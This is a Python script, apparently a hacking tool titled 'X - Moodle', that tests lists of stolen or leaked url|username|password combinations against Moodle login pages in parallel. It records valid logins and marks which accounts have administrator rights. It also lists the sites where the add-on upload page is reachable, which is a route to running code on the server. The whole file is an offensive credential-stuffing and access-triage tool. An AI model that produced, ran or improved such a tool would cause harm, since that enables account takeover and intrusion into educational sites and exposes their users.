import requests
import os
import sys
import re
from colorama import Fore, init
from cfonts import say
from multiprocessing import Pool as ThreadPool

init(autoreset=True)
requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)

def Banner():
    os.system("cls" if os.name == "nt" else "clear")
    say("X - Moodle", colors=["red", "green"], align="center")
    say("Created by X-1337", space=False, font="console", colors=["white"], background="red", align="center")
    print("")

def Logs(args):
    sys.stdout.write(f"\n{args}")

class MoodleChecker:
    def __init__(self, lista):
        self.session = requests.Session()
        self.url = lista.split("|")[0]
        self.username = lista.split("|")[1]
        self.password = lista.split("|")[2]
        self.headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.71 Safari/537.36"
        }
        self.timeout = 10
    
    def setLoginToken(self):
        try:
            req = self.session.get(self.url, headers=self.headers, verify=False, timeout=self.timeout).text
            return re.findall(r'"logintoken" value="(.*?)"', req)[0]
        except:
            return ""
    
    def isHasPlugin(self):
        try:
            req = self.session.get(self.url.replace("/login/index.php", "/admin/tool/installaddon/index.php"), headers=self.headers, verify=False, timeout=self.timeout).text
            if 'name="zipfilechoose"' in req:
                return True
            else:
                return False
        except:
            return False
    
    def isAdmin(self):
        try:
            req = self.session.get(self.url.replace("/login/index.php", "/my"), headers=self.headers, verify=False, timeout=self.timeout).text
            if "admin/search.php" in req:
                return True
            else:
                return False
        except:
            return False
    
    def start(self):
        try:
            data = {
                "anchor": "",
                "logintoken": self.setLoginToken(),
                "username": self.username,
                "password": self.password,
            }
            
            req = self.session.post(self.url, data=data, verify=False, headers=self.headers, timeout=self.timeout, allow_redirects=False)
            
            if req.status_code == 303 and "MOODLEID1_=deleted" in req.headers["Set-Cookie"]:
                formats = self.url + "|" + self.username + "|" + self.password
                with open("ValidLogin.txt", "a", encoding="utf-8") as f:
                    f.write(formats + "\n")
                Logs(f"{Fore.WHITE}---> {Fore.LIGHTYELLOW_EX}{self.url} {Fore.LIGHTGREEN_EX}--- Good!!")
                
                if self.isAdmin():
                    with open("Admin.txt", "a", encoding="utf-8") as f:
                        f.write(formats + "\n")
                    Logs(f"{Fore.WHITE}---> {Fore.LIGHTYELLOW_EX}{self.url} {Fore.LIGHTGREEN_EX}--- Admin Access!!")

                if self.isHasPlugin():
                    formats = self.url + "|" + self.username + "|" + self.password
                    with open("Plugin.txt", "a", encoding="utf-8") as f:
                        f.write(formats + "\n")
                    Logs(f"{Fore.WHITE}---> {Fore.LIGHTYELLOW_EX}{self.url} {Fore.LIGHTGREEN_EX}--- Has Plugin!!")
            else:
                Logs(f"{Fore.WHITE}---> {Fore.LIGHTYELLOW_EX}{self.url} {Fore.LIGHTRED_EX}--- Bad!!")
        except:
            Logs(f"{Fore.WHITE}---> {Fore.LIGHTYELLOW_EX}{self.url} {Fore.LIGHTRED_EX}--- Bad!!")

def Runner(lista):
    MoodleChecker(lista).start()

if __name__=="__main__":
    Banner()
    input_list = [j.strip("\r\n") for j in open(input(f"{Fore.WHITE} Your List : "), "r", encoding="utf-8").readlines()]
    Thread = input(f"{Fore.WHITE} Thread : ")
    pool = ThreadPool(int(Thread))
    pool.map(Runner, input_list)
    pool.close()
    pool.join()
